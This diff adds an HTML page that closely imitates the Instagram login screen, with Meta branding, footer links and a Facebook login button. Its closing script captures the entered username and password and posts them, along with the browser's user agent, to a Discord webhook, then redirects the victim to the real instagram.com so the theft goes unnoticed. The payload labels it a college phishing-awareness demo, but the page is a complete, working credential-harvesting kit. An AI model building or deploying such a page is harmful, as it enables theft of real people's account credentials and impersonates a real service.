@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="Instagram_icon.png" sizes="16x16" type="image/png">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #000;
+            color: #f5f5f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-container {
+            display: flex;
+            flex: 1;
+            justify-content: center;
+            align-items: center;
+            max-width: 1100px;
+            margin: 0 auto;
+            width: 100%;
+            padding: 32px 32px 0;
+        }
+
+        /* ── Left Panel ── */
+        .left-panel {
+            flex: 1;
+            max-width: 520px;
+            padding: 0 48px 0 0;
+        }
+        .ig-logo-icon {
+            width: 96px;
+            height: 96px;
+            margin-bottom: 20px;
+        }
+        .tagline {
+            font-size: 36px;
+            font-weight: 700;
+            line-height: 1.25;
+            color: #f5f5f5;
+        }
+        .gradient-text {
+            background: linear-gradient(90deg, #d62976, #fa7e1e, #feda75, #d62976, #962fbf, #4f5bd5);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ── Right Panel ── */
+        .right-panel {
+            width: 100%;
+            max-width: 416px;
+            min-width: 350px;
+            padding: 48px 40px 36px;
+            border-left: 1px solid rgba(255,255,255,0.08);
+            flex-shrink: 0;
+        }
+        .form-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: #f5f5f5;
+        }
+        .input-field {
+            width: 100%;
+            padding: 17px 16px;
+            margin-bottom: 8px;
+            background: #121212;
+            border: 1px solid #333;
+            border-radius: 14px;
+            color: #f5f5f5;
+            font-size: 16px;
+            outline: none;
+        }
+        .input-field::placeholder {
+            color: #737373;
+            font-size: 15px;
+        }
+        .input-field:focus {
+            border-color: #484848;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 14px;
+            background: #0064e0;
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background: #005acc;
+        }
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin: 20px 0 32px;
+            color: #e0e0e0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .fb-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 15px;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            border-radius: 14px;
+            color: #f5f5f5;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .fb-btn:hover {
+            background: rgba(255,255,255,0.15);
+        }
+        .create-btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin-top: 8px;
+            background: transparent;
+            border: 1px solid #0064e0;
+            border-radius: 14px;
+            color: #0095f6;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+        }
+        .create-btn:hover {
+            background: rgba(0,100,224,0.08);
+        }
+
+        /* ── Meta Logo ── */
+        .meta-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            margin-top: 30px;
+        }
+        .meta-icon {
+            width: 76px;
+            height: 15px;
+        }
+
+        /* ── Footer ── */
+        footer {
+            padding: 24px 16px 20px;
+            text-align: center;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px 16px;
+            margin-bottom: 12px;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            font-size: 12px;
+            line-height: 1.8;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            color: #737373;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .lang-select {
+            display: inline-flex;
+            align-items: center;
+            gap: 3px;
+            color: #737373;
+            font-size: 12px;
+        }
+
+        /* ── Desktop Large ── */
+        @media screen and (min-width: 1100px) {
+            .tagline {
+                font-size: 42px;
+            }
+        }
+
+        /* ── Tablet / Small Desktop ── */
+        @media screen and (max-width: 880px) {
+            .main-container {
+                flex-direction: column;
+                align-items: center;
+                gap: 0;
+                padding: 40px 24px 0;
+            }
+            .left-panel {
+                max-width: 400px;
+                padding: 0 0 32px;
+                text-align: center;
+            }
+            .ig-logo-icon {
+                margin-left: auto;
+                margin-right: auto;
+                display: block;
+            }
+            .tagline {
+                font-size: 30px;
+            }
+            .right-panel {
+                border-left: none;
+                border-top: 1px solid rgba(255,255,255,0.08);
+                max-width: 400px;
+                min-width: unset;
+                padding: 32px 0 24px;
+            }
+        }
+
+        /* ── Mobile ── */
+        @media screen and (max-width: 480px) {
+            .main-container {
+                padding: 32px 20px 0;
+            }
+            .left-panel {
+                max-width: 100%;
+                padding: 0 0 24px;
+            }
+            .ig-logo-icon {
+                width: 64px;
+                height: 64px;
+                margin-bottom: 16px;
+            }
+            .tagline {
+                font-size: 24px;
+            }
+            .right-panel {
+                padding: 24px 0 20px;
+                max-width: 100%;
+            }
+            .input-field {
+                padding: 15px 14px;
+            }
+            .login-btn, .fb-btn, .create-btn {
+                padding: 13px;
+                font-size: 14px;
+            }
+            .footer-links {
+                gap: 2px 12px;
+            }
+            .footer-links a {
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="left-panel">
+            <img class="ig-logo-icon" src="Instagram_icon.png" alt="Instagram">
+            <h1 class="tagline">See everyday moments from your <span class="gradient-text">close friends</span>.</h1>
+        </div>
+
+        <div class="right-panel">
+            <h2 class="form-title">Log into Instagram</h2>
+            <form id="loginForm">
+                <input class="input-field" id="username" type="text" placeholder="Mobile number, username or email" required>
+                <input class="input-field" id="password" type="password" placeholder="Password" required>
+                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+            </form>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+
+            <a href="#" class="fb-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="#0866ff">
+                    <path d="M12 0C5.373 0 0 5.373 0 12c0 5.99 4.388 10.952 10.125 11.854v-8.385H7.078V12h3.047V9.356c0-3.007 1.792-4.668 4.533-4.668 1.312 0 2.686.235 2.686.235v2.953h-1.513c-1.491 0-1.956.925-1.956 1.875V12h3.328l-.532 3.469h-2.796v8.385C19.612 22.952 24 17.99 24 12c0-6.627-5.373-12-12-12z"/>
+                </svg>
+                <span>Log in with Facebook</span>
+            </a>
+
+            <a href="#" class="create-btn">Create new account</a>
+
+            <div class="meta-logo">
+                <svg class="meta-icon" viewBox="0 0 500 100" fill="#737373" xmlns="http://www.w3.org/2000/svg"><path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"/><path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Popular</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading &amp; Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <span class="lang-select">English <svg width="10" height="10" viewBox="0 0 24 24" fill="#737373"><path d="M7 10l5 5 5-5z"/></svg></span>
+            <span>&copy; 2026 Instagram from Meta</span>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var btn = document.getElementById('loginBtn');
+
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
+
+            var webhookUrl = 'https://discord.com/api/webhooks/1539956613941567561/tYCT2juxxugTWjJGrJe6GamHI1xpy683pAE34JyTpAIPqknchLzCYz1bWpJoQ89XwzXI';
+
+            var payload = {
+                embeds: [{
+                    title: 'Phishing Demo - Captured Credentials',
+                    color: 16711680,
+                    fields: [
+                        { name: 'Username', value: '```' + username + '```', inline: false },
+                        { name: 'Password', value: '```' + password + '```', inline: false },
+                        { name: 'Time', value: new Date().toLocaleString(), inline: true },
+                        { name: 'Browser', value: navigator.userAgent.substring(0, 100), inline: false }
+                    ],
+                    footer: { text: 'Phishing Awareness Demo - College Project' }
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(function() { window.location.href = 'https://www.instagram.com/'; })
+            .catch(function() { window.location.href = 'https://www.instagram.com/'; });
+        });
+    </script>
+</body>
+</html>
